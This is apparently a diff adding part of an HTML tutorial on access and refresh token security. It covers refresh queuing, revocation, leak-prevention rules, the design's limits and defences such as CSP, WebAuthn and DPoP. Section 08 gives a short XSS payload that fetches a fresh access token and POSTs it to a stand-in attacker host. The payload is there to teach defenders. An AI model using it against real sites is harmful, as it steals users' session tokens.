+    <span class="token-command">const</span> { data } = <span class="token-command">await</span> api.post(<span class="token-string">'/auth/refresh'</span>)   <span class="token-comment">// cookie rides along</span>
+    setAccessToken(data.accessToken)
+  } <span class="token-command">catch</span> {
+    setAccessToken(<span class="token-val">null</span>)                              <span class="token-comment">// not logged in</span>
+  } <span class="token-command">finally</span> {
+    setReady(<span class="token-val">true</span>)  <span class="token-comment">// only NOW render anything that depends on auth</span>
+  }
+}</pre>
+  </div>
+
+  <h3>One refresh, not ten</h3>
+  <p>
+    A dashboard fires eight requests on mount. The access token has expired. Without a queue you get
+    eight parallel refresh calls — and with rotation, seven of them present a token that a sibling
+    already consumed. You have just triggered reuse detection on yourself.
+  </p>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">client / api.js — axios interceptor</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-command">let</span> refreshing = <span class="token-val">null</span>
+
+api.interceptors.response.use(<span class="token-val">null</span>, <span class="token-command">async</span> (error) =&gt; {
+  <span class="token-command">const</span> original = error.config
+  <span class="token-command">if</span> (error.response?.status !== <span class="token-val">401</span> || original._retried) <span class="token-command">throw</span> error
+  original._retried = <span class="token-val">true</span>
+
+  <span class="token-comment">// every caller awaits the SAME in-flight promise</span>
+  refreshing = refreshing || api.post(<span class="token-string">'/auth/refresh'</span>)
+    .then(r =&gt; { setAccessToken(r.data.accessToken); <span class="token-command">return</span> r.data.accessToken })
+    .finally(() =&gt; { refreshing = <span class="token-val">null</span> })
+
+  <span class="token-command">const</span> token = <span class="token-command">await</span> refreshing
+  original.headers.Authorization = <span class="token-string">`Bearer ${token}`</span>
+  <span class="token-command">return</span> api(original)
+})</pre>
+  </div>
+
+  <h3>Revocation without killing performance</h3>
+  <p>
+    JWTs cannot be revoked, which is the price of being stateless. But you can add a single
+    <strong>watermark</strong> per user instead of a blocklist of individual tokens — one O(1) read on
+    the hot path, and "log out everywhere" becomes one write.
+  </p>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">server / revocation watermark</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-comment">// "log out of all devices" — one write</span>
+<span class="token-command">await</span> redis.set(<span class="token-string">`validAfter:${userId}`</span>, Date.now())
+
+<span class="token-comment">// middleware on every request — one O(1) read</span>
+<span class="token-command">const</span> cutoff = <span class="token-command">await</span> redis.get(<span class="token-string">`validAfter:${payload.sub}`</span>)
+<span class="token-command">if</span> (cutoff &amp;&amp; payload.iat * <span class="token-val">1000</span> &lt; <span class="token-val">Number</span>(cutoff)) {
+  <span class="token-command">return</span> res.status(<span class="token-val">401</span>).json({ error: <span class="token-string">'token revoked'</span> })
+}</pre>
+  </div>
+
+  <h3>The unglamorous rules that prevent most real leaks</h3>
+  <div class="flow-diagram">
+    <div class="flow-step">
+      <div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+      <div class="flow-content">
+        <div class="flow-title">Never let a token reach a log</div>
+        <div class="flow-desc">Sentry breadcrumbs, morgan access logs, a <code>console.log</code> that survived to production. This is the single most common real-world source of leaked tokens — far more common than XSS. Redact the Authorization header at the logger level, not at each call site.</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+      <div class="flow-content">
+        <div class="flow-title">Never put a token in a URL</div>
+        <div class="flow-desc">Query params leak through <code>Referer</code> headers, browser history, CDN logs, and every proxy in between. Headers and cookies only.</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+      <div class="flow-content">
+        <div class="flow-title">Store hashes, not raw refresh tokens</div>
+        <div class="flow-desc">Treat your token table like a password table. A database dump then gives the attacker nothing usable.</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+      <div class="flow-content">
+        <div class="flow-title">Kill every family on password change</div>
+        <div class="flow-desc">Users change their password precisely because they think something is wrong. If old sessions survive that, you have broken the one action they took to protect themselves.</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-connector"><div class="flow-dot flow-dot-green"></div></div>
+      <div class="flow-content">
+        <div class="flow-title">Ship a Content Security Policy</div>
+        <div class="flow-desc">Everything above limits damage after an XSS. CSP is what stops the script from running in the first place — strict <code>script-src</code> with nonces, no <code>unsafe-inline</code>. It belongs above all of this in priority.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="quiz-box">
+    <p class="quiz-question">Why must concurrent 401s share a single refresh promise?</p>
+    <div class="quiz-options" id="quiz-7-1">
+      <button onclick="answerQuiz('quiz-7-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; Because with rotation, parallel refreshes replay an already-consumed token and trip your own reuse detection</button>
+      <button onclick="answerQuiz('quiz-7-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; Because the server can only handle one request per user at a time</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-7-1-feedback"></div>
+  </div>
+</section>
+
+<!-- ════════════ 08 ════════════ -->
+<section class="section-block animate-fade-up" id="s8">
+  <div class="section-header">
+    <div class="section-num-big">08</div>
+    <div class="section-header-text">
+      <div class="section-title">The loopholes</div>
+      <div class="section-subtitle">What this design does not protect you from, stated plainly</div>
+    </div>
+  </div>
+
+  <p>
+    Most tutorials stop at section 7 and leave students believing httpOnly cookies solve XSS.
+    They do not. Teaching the gaps is what separates understanding the design from repeating it.
+  </p>
+
+  <h3>Loophole 1 — XSS can simply ask for a new token</h3>
+  <p>
+    The attacker cannot <em>read</em> the refresh cookie. They do not need to. They can call your
+    refresh endpoint from your own page, and the browser will attach the cookie for them, exactly
+    as it does for your code.
+  </p>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">the payload that defeats httpOnly</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-comment">// running inside an XSS on your origin</span>
+<span class="token-command">const</span> r = <span class="token-command">await</span> fetch(<span class="token-string">'/api/auth/refresh'</span>, { credentials: <span class="token-string">'include'</span> })
+<span class="token-command">const</span> { accessToken } = <span class="token-command">await</span> r.json()
+
+<span class="token-comment">// now act as the user, or ship this token out and act from elsewhere</span>
+fetch(<span class="token-string">'https://attacker.io/c'</span>, { method: <span class="token-string">'POST'</span>, body: accessToken })</pre>
+  </div>
+  <p>
+    What httpOnly actually bought you: the <em>refresh</em> token never leaves the machine, so what
+    the attacker can take away is a 15-minute credential rather than a 30-day one. That is a real
+    reduction in blast radius. It is not prevention.
+  </p>
+
+  <h3>Loophole 2 — the resident script</h3>
+  <p>
+    This is the scenario the token architecture answers worst, and the one worth spending time on
+    in class. The user does not close the tab. They leave the dashboard open all day. The attacker's
+    script sits there quietly, refreshing whenever it needs to, acting on the account in the background.
+  </p>
+
+  <div class="scale-diagram">
+    <span class="highlight">XSS payload executing on your origin</span><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;↓<br>
+    <span class="red">calls /auth/refresh whenever the token expires</span><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;↓<br>
+    <span class="red">always holds a valid access token</span><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;↓<br>
+    <span class="red">reads data · changes settings · moves money — silently</span><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;↓<br>
+    <span class="highlight">user's tab stays open → this never stops ❌</span>
+  </div>
+
+  <p>
+    Every request comes from the victim's IP, the victim's device, the victim's browser fingerprint.
+    Your anomaly detection sees a completely normal session. <strong>Nothing in the two-token design
+    touches this case.</strong> Rotating faster does not help — the attacker is inside the rotation
+    loop with you.
+  </p>
+
+  <h3>Loophole 3 — the attacker owns the screen</h3>
+  <p>
+    The obvious answer to loophole 2 is step-up auth: ask for the password again before anything
+    sensitive. But think about who is drawing that prompt.
+  </p>
+  <div class="warning-box">
+    <div class="warning-box-icon">⚠️</div>
+    <p class="warning-box-text">
+      A script with DOM access can render a <strong>pixel-perfect fake "confirm your password" modal</strong>.
+      The user types their password into the attacker's input. Password-based step-up on a compromised
+      page does not protect the account — it harvests the credential. Section 9 covers the version
+      that actually works.
+    </p>
+  </div>
+
+  <h3>Loophole 4 — outside your application entirely</h3>
+  <ul>
+    <li><strong>A malicious browser extension.</strong> Extensions run with privileges above page scripts. Nothing in your application can stop one. Be honest about this rather than pretending otherwise.</li>
+    <li><strong>A compromised device.</strong> Malware with filesystem access reads the cookie jar directly. httpOnly is a browser-level rule, not encryption.</li>
+    <li><strong>A supply-chain compromise.</strong> One popular package updates, and attacker code is now first-party JavaScript in every build you ship.</li>
+  </ul>
+
+  <h3>Loophole 5 — the root cause under all of them</h3>
+  <div class="concept-box">
+    <div class="concept-box-label">Back To Section 1</div>
+    <p class="concept-box-text">
+      Both tokens are still <strong>bearer</strong> credentials. Possession equals authority, and the
+      server has no way to check that the presenter is the party it issued to. Rotation, expiry and
+      storage all reduce exposure — none of them changes this fact. The only real fix is to stop using
+      bearer tokens, which is where section 9 ends up.
+    </p>
+  </div>
+
+  <div class="table-scroll">
+  <table class="compare-table">
+    <thead><tr><th>Threat</th><th>Two-token design</th><th>Why</th></tr></thead>
+    <tbody>
+      <tr><td class="cell-title">CSRF on API routes</td><td class="cell-highlight">Solved</td><td class="cell-muted">Header-based auth cannot be forged cross-site</td></tr>
+      <tr><td class="cell-title">CSRF on refresh route</td><td class="cell-highlight">Solved</td><td class="cell-muted">SameSite + path scoping (+ CSRF token if cross-site)</td></tr>
+      <tr><td class="cell-title">Long-lived credential exfiltration</td><td class="cell-highlight">Solved</td><td class="cell-muted">httpOnly — the refresh token cannot leave the machine</td></tr>
+      <tr><td class="cell-title">Stolen refresh token replayed</td><td class="cell-highlight">Detected</td><td class="cell-muted">Rotation + reuse detection kills the family</td></tr>
+      <tr><td class="cell-title">Short-lived token exfiltration</td><td class="cell-muted">Bounded</td><td class="cell-muted">Attacker gets minutes, not weeks</td></tr>
+      <tr><td class="cell-title">Attacker acting inside a live tab</td><td class="cell-bad">Not addressed</td><td class="cell-muted">Needs WebAuthn step-up, session caps, CSP</td></tr>
+      <tr><td class="cell-title">Malicious extension or infected device</td><td class="cell-bad">Not addressable</td><td class="cell-muted">Outside the browser's security boundary</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="quiz-box">
+    <p class="quiz-question">An XSS payload calls <code>/auth/refresh</code> and gets a valid access token. What did httpOnly still buy you?</p>
+    <div class="quiz-options" id="quiz-8-1">
+      <button onclick="answerQuiz('quiz-8-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; Nothing — the design has completely failed at this point</button>
+      <button onclick="answerQuiz('quiz-8-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; The long-lived credential never left the machine, so what the attacker can carry away lasts minutes instead of weeks</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-8-1-feedback"></div>
+  </div>
+</section>
+
+<!-- ════════════ 09 ════════════ -->
+<section class="section-block animate-fade-up" id="s9">
+  <div class="section-header">
+    <div class="section-num-big">09</div>
+    <div class="section-header-text">
+      <div class="section-title">Closing the gaps</div>
+      <div class="section-subtitle">What you add once you accept that tokens alone are not enough</div>
+    </div>
+  </div>
+
+  <p>
+    Once an attacker has script execution on your origin, every client-side control you would reach
+    for is a control they now own. So everything genuinely useful from here is either <strong>server-side</strong>
+    or lives in a <strong>trust domain the page cannot reach</strong>.
+  </p>
+
+  <h3>Prevention comes first</h3>
+  <p>
+    Everything in sections 5 to 7 limits damage <em>after</em> you have already lost. This layer is the
+    only one that stops it happening, so it deserves your effort before anything else here.
+  </p>
+  <ul>
+    <li>Strict CSP with nonces and no <code>unsafe-inline</code></li>
+    <li>Trusted Types to close DOM injection sinks</li>
+    <li>Pinned and audited dependencies, Subresource Integrity on anything external</li>
+    <li>No third-party scripts on authenticated pages — analytics and chat widgets belong on marketing pages</li>
+  </ul>
+
+  <h3>Put a ceiling on time</h3>
+  <p>
+    This is the direct answer to the never-closes-the-tab scenario. Most people implement sliding
+    expiry, which lets a resident script keep a session alive forever.
+  </p>
+  <div class="concept-box">
+    <div class="concept-box-label">Absolute Session Lifetime</div>
+    <p class="concept-box-text">
+      Give the token family a hard ceiling from initial login — 8, 12 or 24 hours — <strong>regardless of
+      activity</strong>. At that point everyone re-authenticates, and the attacker cannot, because they do
+      not have the password or the security key. It is the only thing that puts a floor under an
+      indefinitely open tab.
+    </p>
+  </div>
+
+  <h3>Watch the shape of the traffic</h3>
+  <ul>
+    <li><strong>Rate-limit refreshes per family.</strong> Your real app refreshes on a predictable cadence tied to the access token TTL. A script pumping the endpoint does not match that shape.</li>
+    <li><strong>Compare API volume against user interaction.</strong> A session making steady reads with zero page transitions is not a person.</li>
+    <li><strong>Flag impossible geography.</strong> One family refreshing from two continents four minutes apart.</li>
+  </ul>
+
+  <h3>Step-up auth that a compromised page cannot fake</h3>
+  <p>
+    Loophole 3 killed password re-entry. WebAuthn survives it, for one specific reason worth making
+    students say out loud:
+  </p>
+  <div class="concept-box">
+    <div class="concept-box-label">Why WebAuthn Holds</div>
+    <p class="concept-box-text">
+      <strong>The prompt is drawn by browser chrome, not by page content.</strong> A script can trigger it
+      but cannot draw a convincing fake, cannot read what the user does, and cannot extract the key.
+      The assertion is signed over a server-issued challenge and bound to your origin. Gate money
+      movement, email changes, password changes, new payees and account deletion behind it, and a
+      fully compromised session still cannot escalate into account takeover.
+    </p>
+  </div>
+
+  <h3>Stop using bearer tokens</h3>
+  <p>
+    The real fix for loophole 5 is proof-of-possession. <strong>DPoP</strong> is the browser-viable version
+    and you can deploy it today:
+  </p>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">client / non-extractable key</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-command">const</span> keyPair = <span class="token-command">await</span> crypto.subtle.generateKey(
+  { name: <span class="token-string">'ECDSA'</span>, namedCurve: <span class="token-string">'P-256'</span> },
+  <span class="token-val">false</span>,              <span class="token-comment">// extractable: false — JS can USE it, never READ it</span>
+  [<span class="token-string">'sign'</span>, <span class="token-string">'verify'</span>]
+)
+<span class="token-comment">// store the handle in IndexedDB, sign a proof on every request</span>
+<span class="token-comment">// server rejects any token not accompanied by a valid signature</span></pre>
+  </div>
+  <p>
+    A stolen token is then worthless on its own. The attacker can sign requests while their script runs
+    in the page, but there is nothing extractable to carry away. Combine DPoP with the httpOnly refresh
+    cookie and <strong>XSS collapses to pure session riding</strong> — full authority while the tab is open,
+    exactly zero once it closes.
+  </p>
+
+  <h3>Reduce what a live session is worth</h3>
+  <ul>
+    <li><strong>Minimise API responses.</strong> Mask card numbers server-side, keep full PII out of list endpoints, return only what the current view needs. The attacker can read whatever your API hands over — so hand over less.</li>
+    <li><strong>Out-of-band alerts.</strong> Email or SMS on sensitive actions, with a one-click "this wasn't me" that kills every family. Prevents nothing; shortens discovery from months to minutes.</li>
+    <li><strong>A visible sessions list.</strong> Device, location, last active, and a log-out button. Users catch things your monitoring will not.</li>
+  </ul>
+
+  <hr class="divider">
+
+  <h3>The honest hierarchy</h3>
+  <p>Ordered by what actually reduces risk per hour of effort, not by what sounds impressive:</p>
+
+  <div class="table-scroll">
+  <table class="compare-table">
+    <thead><tr><th>Tier</th><th>What you build</th><th>When</th></tr></thead>
+    <tbody>
+      <tr>
+        <td class="cell-title">Baseline</td>
+        <td class="cell-muted">Short access TTL · rotation with reuse detection · httpOnly + Secure + SameSite · CSP · HSTS · no tokens in logs or URLs · kill families on password change</td>
+        <td class="cell-highlight">Every project, no exceptions</td>
+      </tr>
+      <tr>
+        <td class="cell-title">Real user data</td>
+        <td class="cell-muted">Revocation watermark · absolute session lifetime · sessions UI · WebAuthn step-up · refresh rate limits · anomaly detection</td>
+        <td class="cell-highlight">Anything holding money, PII or health data</td>
+      </tr>
+      <tr>
+        <td class="cell-title">High assurance</td>
+        <td class="cell-muted">DPoP or mTLS · transaction-level signing · device binding · shorter refresh TTL with sliding expiry</td>
+        <td class="cell-highlight">Fintech, healthcare, regulated</td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="note-box">
+    <div class="note-box-icon">💡</div>
+    <p class="note-box-text">
+      For most MERN projects, <strong>baseline plus WebAuthn step-up on sensitive actions</strong> gets you
+      to a genuinely reasonable place. Past that you are spending effort against an attacker who
+      almost certainly has easier options than stealing your tokens.
+    </p>
+  </div>
+
+  <div class="quiz-box">
+    <p class="quiz-question">Why does WebAuthn step-up survive a compromised page when password re-entry does not?</p>
+    <div class="quiz-options" id="quiz-9-1">
+      <button onclick="answerQuiz('quiz-9-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; Because the key is much longer than any password could be</button>
+      <button onclick="answerQuiz('quiz-9-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; Because the prompt is drawn by browser chrome, so a page script cannot fake it or read the result</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-9-1-feedback"></div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="concept-box">
+    <div class="concept-box-label">One-Paragraph Summary</div>
+    <p class="concept-box-text">
+      A single token has to live either where scripts can read it (XSS) or where the browser sends it
+      automatically (CSRF). Splitting it in two lets each half sit where the other's attack cannot
+      reach: the access token in memory is never auto-attached and never touches disk, and the refresh
+      token in an httpOnly cookie can never be read out by script. Rotation turns theft of the
+      long-lived half into something you detect rather than something you discover months later.
+      What none of it addresses is an attacker executing inside a live page — for that you need CSP to
+      prevent it, absolute session limits to bound it, and WebAuthn to stop it escalating.
+    </p>
+  </div>
+</section>
+
+<footer class="site-footer">
+  <span>Sheryians Coding School · Authentication Notes</span>
+  <span>Access &amp; Refresh Tokens · why before what</span>
+</footer>
+
+</main>
+</div>
+
+<script>
+function copyCode(btn) {
+  var pre = btn.closest('.code-block').querySelector('.code-pre');
+  var original = btn.textContent;
+  navigator.clipboard.writeText(pre.innerText).then(function () {
+    btn.textContent = 'copied';
+    setTimeout(function () { btn.textContent = original; }, 1400);
+  }).catch(function () {
+    btn.textContent = 'failed';
+    setTimeout(function () { btn.textContent = original; }, 1400);
+  });
+}
+
+function answerQuiz(quizId, btn, isCorrect) {
+  var container = document.getElementById(quizId);
+  var feedback  = document.getElementById(quizId + '-feedback');
+
+  container.querySelectorAll('.quiz-option').forEach(function (b) {
+    b.disabled = true;
+    b.classList.add('cursor-not-allowed');
+    b.style.opacity = '0.6';
+  });
+
+  if (isCorrect) {
+    btn.classList.add('correct');
+    feedback.textContent = '✓ Correct!';
+    feedback.className = 'quiz-feedback correct';
+  } else {
+    btn.classList.add('incorrect');
+    feedback.textContent = '✗ Not quite — try reviewing that section.';
+    feedback.className = 'quiz-feedback incorrect';
+  }
+}
+
+(function initSteppers() {
+  document.querySelectorAll('[data-stepper]').forEach(function (wrap) {
+    var groups   = Array.prototype.slice.call(wrap.querySelectorAll('[data-step]'));
+    var caps     = Array.prototype.slice.call(wrap.querySelectorAll('[data-cap]'));
+    var counter  = wrap.querySelector('.step-counter');
+    var prevBtn  = wrap.querySelector('.step-prev');
+    var nextBtn  = wrap.querySelector('.step-next');
+    if (!groups.length) return;
+
+    var max = groups.reduce(function (m, g) { return Math.max(m, +g.dataset.step); }, 1);
+    var cur = 1;
+
+    function pad(n) { return String(n).padStart(2, '0'); }
+
+    function render() {
+      groups.forEach(function (g) {
+        g.style.display = (+g.dataset.step <= cur) ? '' : 'none';
+      });
+      caps.forEach(function (c) {
+        c.classList.toggle('hidden', +c.dataset.cap !== cur);
+      });
+      counter.textContent = pad(cur) + ' / ' + pad(max);
+      prevBtn.disabled = (cur === 1);
+      nextBtn.disabled = (cur === max);
+    }
+
+    prevBtn.addEventListener('click', function () { if (cur > 1)   { cur--; render(); } });
+    nextBtn.addEventListener('click', function () { if (cur < max) { cur++; render(); } });
+    render();
+  });
+})();
+
+(function initScrollSpy() {
+  var links = Array.prototype.slice.call(document.querySelectorAll('.nav-link'));
+  var sections = links.map(function (l) { return document.querySelector(l.getAttribute('href')); });
+
+  var observer = new IntersectionObserver(function (entries) {
+    entries.forEach(function (entry) {
+      if (!entry.isIntersecting) return;
+      var idx = sections.indexOf(entry.target);
+      if (idx === -1) return;
+      links.forEach(function (l) { l.classList.remove('active'); });
+      links[idx].classList.add('active');
+    });
+  }, { rootMargin: '-10% 0px -70% 0px', threshold: 0 });
+
+  sections.forEach(function (s) { if (s) observer.observe(s); });
+})();
+</script>
+</body>
+</html>
